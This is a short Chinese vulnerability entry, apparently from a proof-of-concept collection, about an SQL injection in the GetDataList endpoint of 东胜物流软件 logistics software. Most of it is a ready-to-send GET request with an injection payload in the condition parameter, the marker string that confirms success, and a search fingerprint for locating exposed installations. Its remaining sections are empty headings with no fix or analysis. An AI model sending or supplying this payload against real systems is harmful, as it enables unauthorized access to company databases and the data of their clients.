# 东胜物流软件GetDataList存在SQL注入漏洞

- **系统**：东胜物流软件　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"Z4c2hPCi5IR/AnH5vZXNSQ=="`
- **请求**：`GET /TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort&condition=123+IN+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113))--%20&page=1&page=1 HTTP/1.1`

**请求体 / payload**
```
qxpqqqzkqq
```

**其他**
- 东胜物流软件GetDataList存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 东胜物流软件